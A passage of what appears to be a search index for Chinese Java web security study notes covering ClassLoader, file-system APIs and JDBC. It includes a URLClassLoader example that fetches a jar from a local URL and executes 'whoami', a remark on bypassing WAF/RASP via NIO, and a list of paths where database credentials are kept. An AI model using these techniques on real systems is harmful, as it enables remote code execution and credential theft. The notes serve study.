}","title":"ClassLoader\u7c7b\u52a0\u8f7d\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#classloader\u7c7b\u52a0\u8f7d\u673a\u5236","text":"Java\u7a0b\u5e8f\u5728\u8fd0\u884c\u524d\u9700\u8981\u5148\u7f16\u8bd1\u6210 class\u6587\u4ef6 \uff0cJava\u7c7b\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.lang.ClassLoader \u52a0\u8f7d\u7c7b\u5b57\u8282\u7801\uff0c ClassLoader \u4f1a\u8c03\u7528JVM\u7684native\u65b9\u6cd5( defineClass0/1/2 )\u6765\u5b9a\u4e49\u4e00\u4e2a java.lang.Class \u5b9e\u4f8b\u3002","title":"ClassLoader\u7c7b\u52a0\u8f7d\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#classloader","text":"\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2aClassLoader\uff1a - Bootstrap ClassLoader (\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u8be5\u7c7b\u52a0\u8f7d\u5668\u5b9e\u73b0\u4e8eJVM\u5c42\uff0c\u91c7\u7528C++\u7f16\u5199 - Extension ClassLoader (\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) - App ClassLoader (\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader\u7684\u6838\u5fc3\u65b9\u6cd5\u6709\uff1a 1. loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) 2. findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) 3. findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) 4. defineClass (\u5b9a\u4e49\u4e00\u4e2aJava\u7c7b) 5. resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b)","title":"ClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u7c7b\u52a0\u8f7d\u65b9\u5f0f","text":"","title":"\u7c7b\u52a0\u8f7d\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u663e\u5f0f\u52a0\u8f7d","text":"// \u53cd\u5c04\u52a0\u8f7dTestHelloWorld\u793a\u4f8b Class . forName ( \"top.longlone.TestHelloWorld\" ); // ClassLoader\u52a0\u8f7dTestHelloWorld\u793a\u4f8b this . getClass (). getClassLoader (). loadClass ( \"top.longlone.TestHelloWorld\" );","title":"\u663e\u5f0f\u52a0\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u9690\u5f0f\u52a0\u8f7d","text":"\u6307\u76f4\u63a5 \u7c7b\u540d.\u65b9\u6cd5\u540d() \u6216 new \u7c7b\u5b9e\u4f8b\u3002","title":"\u9690\u5f0f\u52a0\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u7c7b\u52a0\u8f7d\u6d41\u7a0b","text":"\u8c03\u7528 loadClass \u52a0\u8f7d \u8c03\u7528 findLoadedClass \u68c0\u67e5\u662f\u5426\u5df2\u52a0\u8f7d\uff0c\u82e5\u5df2\u52a0\u8f7d\u5219\u76f4\u63a5\u8fd4\u56de\u5df2\u52a0\u8f7d\u7684\u7c7b \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u4e86\u7236\u7c7b\u52a0\u8f7d\u5668( new ClassLoader(\u7236\u7c7b\u52a0\u8f7d\u5668) )\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u5148\u52a0\u8f7d,\u5426\u5219\u4f7f\u7528JVM\u7684 Bootstrap ClassLoader \u52a0\u8f7d \u82e5\u7236\u7c7b\u52a0\u8f7d\u5668\u65e0\u6cd5\u52a0\u8f7d\u5219\u8c03\u7528\u81ea\u8eab findClass \u52a0\u8f7d \u5982\u679c\u8c03\u7528loadClass\u7684\u65f6\u5019\u4f20\u5165\u7684 resolve \u53c2\u6570\u4e3atrue\uff0c\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528 resolveClass \u65b9\u6cd5\u94fe\u63a5\u7c7b,\u9ed8\u8ba4\u4e3afalse \u52a0\u8f7d\u5931\u8d25\u6216\u8fd4\u56de\u52a0\u8f7d\u540e\u7684 java.lang.Class \u7c7b\u5bf9\u8c61","title":"\u7c7b\u52a0\u8f7d\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u81ea\u5b9a\u4e49classloader","text":"package top.longlone ; import java.util.Base64 ; import java.lang.reflect.Method ; public class ClassLoaderStudy extends ClassLoader { private static final String testClassName = \"top.longlone.Hello\" ; // base64 -w Hello.class private static final byte [] testClassBytes = Base64 . getDecoder (). decode ( \"yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=\" ); @Override protected Class <?> findClass ( String name ) throws ClassNotFoundException { if ( name . equals ( testClassName )) { return defineClass ( testClassName , testClassBytes , 0 , testClassBytes . length ); } return super . findClass ( name ); } public static void main ( String [] args ) throws Exception { ClassLoaderStudy loader = new ClassLoaderStudy (); Class testClass = loader . loadClass ( testClassName ); Object o = testClass . newInstance (); Method sayHello = o . getClass (). getMethod ( \"hello\" , String . class ); String longlone = ( String ) sayHello . invoke ( o , \"Longlone\" ); System . out . println ( longlone ); } }","title":"\u81ea\u5b9a\u4e49ClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#urlclassloader","text":"package top.longlone ; import java.io.ByteArrayOutputStream ; import java.io.InputStream ; import java.net.URL ; import java.net.URLClassLoader ; public class ClassLoaderStudy { public static void main ( String [] args ) throws Exception { URL url = new URL ( \"http://127.0.0.1/cmd.jar\" ); URLClassLoader urlClassLoader = new URLClassLoader ( new URL [] { url }); String cmd = \"whoami\" ; Class <?> cmdClass = urlClassLoader . loadClass ( \"top.longlone.CMD\" ); Process process = ( Process ) cmdClass . getMethod ( \"exec\" , String . class ). invoke ( null , cmd ); InputStream inputStream = process . getInputStream (); ByteArrayOutputStream byteArrayInputStream = new ByteArrayOutputStream (); byte [] bytes = new byte [ 1024 ] ; int a = - 1 ; while (( a = inputStream . read ( bytes )) != - 1 ) { byteArrayInputStream . write ( bytes , 0 , a ); } System . out . println ( byteArrayInputStream . toString ()); } }","title":"URLClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","tags":["java","java\u5b89\u5168"],"text":"JAVA\u6587\u4ef6\u7cfb\u7edf # JAVA SE\u5185\u7f6e\u4e86\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edf:\uff1a java.io \u548c java.nio \uff0c java.nio \u7684\u5b9e\u73b0\u662f sun.nio JAVA IO \u6587\u4ef6\u7cfb\u7edf # Java\u62bd\u8c61\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5bf9\u8c61: java.io.FileSystem \uff0c\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf,\u4f8b\u5982 Windows \u548c Unix \u5c31\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf\uff1a java.io.UnixFileSystem \u3001 java.io.WinNTFileSystem java.io.FileSystem \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u62bd\u8c61\u4e86\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684JDK\u4f1a\u5b9e\u73b0\u5176\u62bd\u8c61\u7684\u65b9\u6cd5\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8de8\u5e73\u53f0\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u64cd\u4f5c\u3002 \u9700\u8981\u6ce8\u610f\u7684\u70b9\u6709\uff1a 1. \u5e76\u4e0d\u662f\u6240\u6709\u7684\u6587\u4ef6\u64cd\u4f5c\u90fd\u5728 java.io.FileSystem \u4e2d\u5b9a\u4e49,\u6587\u4ef6\u7684\u8bfb\u53d6\u6700\u7ec8\u8c03\u7528\u7684\u662f java.io.FileInputStream#read0\u3001readBytes \u3001 java.io.RandomAccessFile#read0\u3001readBytes ,\u800c\u5199\u6587\u4ef6\u8c03\u7528\u7684\u662f java.io.FileOutputStream#writeBytes \u3001 java.io.RandomAccessFile#write0 \u3002 2. Java\u6709\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edfAPI\uff01\u4e00\u4e2a\u662f\u57fa\u4e8e \u963b\u585e\u6a21\u5f0f\u7684IO \u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u53e6\u4e00\u662fJDK7+\u57fa\u4e8e NIO.2 \u7684\u6587\u4ef6\u7cfb\u7edf\u3002 FileInputStream # \u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002 ```java package top.longlone; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\Users\\11624\\Desktop\\test.txt\"); FileInputStream fileInputStream = new FileInputStream(file); int a = 0; byte[] bytes = new byte[1024]; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); while ((a = fileInputStream.read(bytes)) != -1) { byteArrayOutputStream.write(bytes, 0, a); } System.out.println(byteArrayOutputStream.toString()); } } ### FileOutputStream \u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002 ```java package top.longlone; import java.io.File; import java.io.FileOutputStream; import java.nio.charset.StandardCharsets; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\\\Users\\\\11624\\\\Desktop\\\\test2.txt\"); String content = \"Hello world.\"; FileOutputStream fileOutputStream = new FileOutputStream(file); fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8)); fileOutputStream.flush(); fileOutputStream.close(); } } JAVA NIO.2 \u6587\u4ef6\u7cfb\u7edf # Java 7\u63d0\u51fa\u4e86\u4e00\u4e2a\u57fa\u4e8eNIO\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u8fd9\u4e2aNIO\u6587\u4ef6\u7cfb\u7edf\u548c\u963b\u585eIO\u6587\u4ef6\u7cfb\u7edf\u4e24\u8005\u662f\u5b8c\u5168\u72ec\u7acb\u7684\u3002 java.nio.file.spi.FileSystemProvider \u5bf9\u6587\u4ef6\u7684\u5c01\u88c5\u548c java.io.FileSystem \u540c\u7406\u3002 NIO\u7684\u6587\u4ef6\u64cd\u4f5c\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u7684\u6700\u7ec8\u5b9e\u73b0\u7c7b\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6bd4\u5982Mac\u7684\u5b9e\u73b0\u7c7b\u662f: sun.nio.fs.UnixNativeDispatcher ,\u800cWindows\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.fs.WindowsNativeDispatcher \u3002 \u5408\u7406\u7684\u5229\u7528NIO\u6587\u4ef6\u7cfb\u7edf\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u67d0\u4e9b\u53ea\u662f\u9632\u5fa1\u4e86 java.io.FileSystem \u7684 WAF / RASP","title":"java\u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java\u6587\u4ef6\u7cfb\u7edf","text":"JAVA SE\u5185\u7f6e\u4e86\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edf:\uff1a java.io \u548c java.nio \uff0c java.nio \u7684\u5b9e\u73b0\u662f sun.nio","title":"JAVA\u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java-io-\u6587\u4ef6\u7cfb\u7edf","text":"Java\u62bd\u8c61\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5bf9\u8c61: java.io.FileSystem \uff0c\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf,\u4f8b\u5982 Windows \u548c Unix \u5c31\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf\uff1a java.io.UnixFileSystem \u3001 java.io.WinNTFileSystem java.io.FileSystem \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u62bd\u8c61\u4e86\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684JDK\u4f1a\u5b9e\u73b0\u5176\u62bd\u8c61\u7684\u65b9\u6cd5\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8de8\u5e73\u53f0\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u64cd\u4f5c\u3002 \u9700\u8981\u6ce8\u610f\u7684\u70b9\u6709\uff1a 1. \u5e76\u4e0d\u662f\u6240\u6709\u7684\u6587\u4ef6\u64cd\u4f5c\u90fd\u5728 java.io.FileSystem \u4e2d\u5b9a\u4e49,\u6587\u4ef6\u7684\u8bfb\u53d6\u6700\u7ec8\u8c03\u7528\u7684\u662f java.io.FileInputStream#read0\u3001readBytes \u3001 java.io.RandomAccessFile#read0\u3001readBytes ,\u800c\u5199\u6587\u4ef6\u8c03\u7528\u7684\u662f java.io.FileOutputStream#writeBytes \u3001 java.io.RandomAccessFile#write0 \u3002 2. Java\u6709\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edfAPI\uff01\u4e00\u4e2a\u662f\u57fa\u4e8e \u963b\u585e\u6a21\u5f0f\u7684IO \u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u53e6\u4e00\u662fJDK7+\u57fa\u4e8e NIO.2 \u7684\u6587\u4ef6\u7cfb\u7edf\u3002","title":"JAVA IO \u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#fileinputstream","text":"\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002 ```java package top.longlone; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\Users\\11624\\Desktop\\test.txt\"); FileInputStream fileInputStream = new FileInputStream(file); int a = 0; byte[] bytes = new byte[1024]; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); while ((a = fileInputStream.read(bytes)) != -1) { byteArrayOutputStream.write(bytes, 0, a); } System.out.println(byteArrayOutputStream.toString()); } } ### FileOutputStream \u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002 ```java package top.longlone; import java.io.File; import java.io.FileOutputStream; import java.nio.charset.StandardCharsets; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\\\Users\\\\11624\\\\Desktop\\\\test2.txt\"); String content = \"Hello world.\"; FileOutputStream fileOutputStream = new FileOutputStream(file); fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8)); fileOutputStream.flush(); fileOutputStream.close(); } }","title":"FileInputStream"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java-nio2-\u6587\u4ef6\u7cfb\u7edf","text":"Java 7\u63d0\u51fa\u4e86\u4e00\u4e2a\u57fa\u4e8eNIO\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u8fd9\u4e2aNIO\u6587\u4ef6\u7cfb\u7edf\u548c\u963b\u585eIO\u6587\u4ef6\u7cfb\u7edf\u4e24\u8005\u662f\u5b8c\u5168\u72ec\u7acb\u7684\u3002 java.nio.file.spi.FileSystemProvider \u5bf9\u6587\u4ef6\u7684\u5c01\u88c5\u548c java.io.FileSystem \u540c\u7406\u3002 NIO\u7684\u6587\u4ef6\u64cd\u4f5c\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u7684\u6700\u7ec8\u5b9e\u73b0\u7c7b\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6bd4\u5982Mac\u7684\u5b9e\u73b0\u7c7b\u662f: sun.nio.fs.UnixNativeDispatcher ,\u800cWindows\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.fs.WindowsNativeDispatcher \u3002 \u5408\u7406\u7684\u5229\u7528NIO\u6587\u4ef6\u7cfb\u7edf\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u67d0\u4e9b\u53ea\u662f\u9632\u5fa1\u4e86 java.io.FileSystem \u7684 WAF / RASP","title":"JAVA NIO.2 \u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/","tags":["java","java\u5b89\u5168"],"text":"JDBC # JDBC(Java Database Connectivity)\u662fJava\u63d0\u4f9b\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8fde\u63a5\u3001\u64cd\u4f5c\u7684\u6807\u51c6API\u3002Java\u81ea\u8eab\u5e76\u4e0d\u4f1a\u53bb\u5b9e\u73b0\u5bf9\u6570\u636e\u5e93\u7684\u8fde\u63a5\u3001\u67e5\u8be2\u3001\u66f4\u65b0\u7b49\u64cd\u4f5c\u800c\u662f\u901a\u8fc7\u62bd\u8c61\u51fa\u6570\u636e\u5e93\u64cd\u4f5c\u7684API\u63a5\u53e3(JDBC)\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u63d0\u4f9b\u5546\u5fc5\u987b\u5b9e\u73b0JDBC\u5b9a\u4e49\u7684\u63a5\u53e3\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u5bf9\u6570\u636e\u5e93\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c JDBC Connection # java \u901a\u8fc7 java.sql.DriverManager \u6765\u7ba1\u7406\u6240\u6709\u6570\u636e\u5e93\u7684\u9a71\u52a8\u6ce8\u518c\uff0c\u6240\u4ee5\u5982\u679c\u60f3\u8981\u5efa\u7acb\u6570\u636e\u5e93\u8fde\u63a5\u9700\u8981\u5148\u5728 java.sql.DriverManager \u4e2d\u6ce8\u518c\u5bf9\u5e94\u7684\u9a71\u52a8\u7c7b\uff0c\u7136\u540e\u8c03\u7528 getConnection \u65b9\u6cd5\u624d\u80fd\u8fde\u63a5\u4e0a\u6570\u636e\u5e93 JDBC \u5b9a\u4e49\u4e86\u4e00\u4e2a\u53eb java.sql.Driver \u7684\u63a5\u53e3\u7c7b\u8d1f\u8d23\u5b9e\u73b0\u5bf9\u6570\u636e\u5e93\u7684\u8fde\u63a5\uff0c\u6240\u6709\u7684\u6570\u636e\u5e93\u9a71\u52a8\u5305\u90fd\u5fc5\u987b\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u624d\u80fd\u591f\u5b8c\u6210\u6570\u636e\u5e93\u7684\u8fde\u63a5\u64cd\u4f5c\u3002 java.sql.DriverManager.getConnection(xx) \u5176\u5b9e\u5c31\u662f\u95f4\u63a5\u7684\u8c03\u7528\u4e86 java.sql.Driver \u7c7b\u7684 connect \u65b9\u6cd5\u5b9e\u73b0\u6570\u636e\u5e93\u8fde\u63a5\u7684\u3002\u6570\u636e\u5e93\u8fde\u63a5\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u4e00\u4e2a\u53eb\u505a java.sql.Connection \u7684\u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61\uff0c\u4e00\u5207\u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u64cd\u4f5c\u90fd\u5c06\u4f9d\u8d56\u4e8e\u8fd9\u4e2a Connection \u5bf9\u8c61 JDBC\u8fde\u63a5\u6570\u636e\u5e93\u7684\u4e00\u822c\u6b65\u9aa4 1. \u6ce8\u518c\u9a71\u52a8: Class.forName(\"\u6570\u636e\u5e93\u9a71\u52a8\u7684\u7c7b\u540d\") 2. \u83b7\u53d6\u8fde\u63a5: `DriverManager.getConnection(xxx ```java // JDBC\u8fde\u63a5\u6570\u636e\u5e93\u793a\u4f8b\u4ee3\u7801 String CLASS_NAME = \"com.mysql.jdbc.Driver\"; String URL = \"jdbc:mysql://localhost:3306/mysql\" String USERNAME = \"root\"; String PASSWORD = \"root\"; Class.forName(CLASS_NAME);// \u6ce8\u518cJDBC\u9a71\u52a8\u7c7b Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD); ``` \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f # \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u5bfb\u627e\u65b9\u6cd5 \u4f20\u7edf\u7684Web\u5e94\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u5b58\u653e\u8def\u5f84 - WEB-INF \u76ee\u5f55\u4e0b\u7684 *.properites .yml *.xml - Spring boot\u9879\u76ee: src/main/resources/ \u5e38\u89c1\u7684\u5b58\u50a8\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u7684\u6587\u4ef6\u8def\u5f84 - WEB-INF/applicationContext.xml - WEB-INF/hibernate.cfg.xml - WEB-INF/jdbc/jdbc.properties - \u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4\u5bfb\u627e,\u5982\u5bfb\u627emysql: find \u8def\u5f84 -type f |xargs grep \"com.mysql.jdbc.Driver\" \u9700\u8981 Class.forName \u7684\u539f\u56e0: \u5728Driver\u7684static\u4e2d\u6ce8\u518c\u4e86\u9a71\u52a8\u5305 Class.forName(\"com.mysql.jdbc.Driver\") \u5b9e\u9645\u4e0a\u4f1a\u89e6\u53d1\u7c7b\u52a0\u8f7d\uff0c com.mysql.jdbc.Driver \u7c7b\u5c06\u4f1a\u88ab\u521d\u59cb\u5316\uff0c\u6240\u4ee5 static \u9759\u6001\u8bed\u53e5\u5757\u4e2d\u7684\u4ee3\u7801\u4e5f\u5c06\u4f1a\u88ab\u6267\u884c \u53cd\u5c04\u7c7b\u800c\u4e0d\u60f3\u89e6\u53d1\u7c7b\u9759\u6001\u4ee3\u7801\u5757\u7684\u9014\u5f84 - Class.forName(\"xxxx\", false, loader) - ClassLoader.load(\"xxxx\") Class.forName \u53ef\u4ee5\u7701\u53bb\u7684\u539f\u56e0 - \u5b9e\u9645\u4e0a\u8fd9\u91cc\u53c8\u5229\u7528\u4e86 Java \u7684\u4e00\u5927\u7279\u6027: Java SPI(Service Provider Interface) \uff0c\u56e0\u4e3a DriverManager \u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.util.ServiceLoader \u7c7b\u63d0\u4f9b\u7684SPI\u673a\u5236\uff0cJava\u4f1a\u81ea\u52a8\u626b\u63cfjar\u5305\u4e2d\u7684 META-INF/services \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5e76\u4e14\u8fd8\u4f1a\u81ea\u52a8\u7684 Class.forName (\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u7c7b) \u603b\u7ed3 # \u8bfe\u540e\u601d\u8003 1. SPI\u673a\u5236 \u662f\u5426\u6709\u5b89\u5168\u6027\u95ee\u9898\uff1f 1. Java SPI\u5b89\u5168 2. Java-SPI\u673a\u5236\u4e0eSnakeYaml\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e 2. Java\u53cd\u5c04 \u6709\u54ea\u4e9b\u5b89\u5168\u95ee\u9898\uff1f java\u53cd\u5c04\u673a\u5236 1. Java\u7c7b\u52a0\u8f7d\u673a\u5236 \u662f\u4ec0\u4e48\uff1f 2. \u6570\u636e\u5e93\u8fde\u63a5\u65f6\u5bc6\u7801\u5b89\u5168\u95ee\u9898\uff1f 3. \u4f7f\u7528JDBC\u5982\u4f55\u5199\u4e00\u4e2a\u901a\u7528\u7684 \u6570\u636e\u5e93\u5bc6\u7801\u7206\u7834 \u6a21\u5757\uff1f","title":"JDBC"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/#jdbc","text":"JDBC(Java Database Connectivity)\u662fJava\u63d0\u4f9b\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8fde\u63a5\u3001\u64cd\u4f5c\u7684\u6807\u51c6API\u3002Java\u81ea\u8eab\u5e76\u4e0d\u4f1a\u53bb\u5b9e\u73b0\u5bf9\u6570\u636e\u5e93\u7684\u8fde\u63a5\u3001\u67e5\u8be2\u3001\u66f4\u65b0\u7b49\u64cd\u4f5c\u800c\u662f\u901a\u8fc7\u62bd\u8c61\u51fa\u6570\u636e\u5e93\u64cd\u4f5c\u7684API\u63a5\u53e3(JDBC)\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u63d0\u4f9b\u5546\u5fc5\u987b\u5b9e\u73b0JDBC\u5b9a\u4e49\u7684\u63a5\u53e3\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u5bf9\u6570\u636e\u5e93\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c","title":"JDBC"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/#jdbc-connection","text":"java \u901a\u8fc7 java.sql.DriverManager \u6765\u7ba1\u7406\u6240\u6709\u6570\u636e\u5e93\u7684\u9a71\u52a8\u6ce8\u518c\uff0c\u6240\u4ee5\u5982\u679c\u60f3\u8981\u5efa\u7acb\u6570\u636e\u5e93\u8fde\u63a5\u9700\u8981\u5148\u5728 java.sql.DriverManager \u4e2d\u6ce8\u518c\u5bf9\u5e94\u7684\u9a71\u52a8\u7c7b\uff0c\u7136\u540e\u8c03\u7528 getConnection \u65b9\u6cd5\u624d\u80fd\u8fde\u63a5\u4e0a\u6570\u636e\u5e93 JDBC \u5b9a\u4e49\u4e86\u4e00\u4e2a\u53eb java.sql.Driver 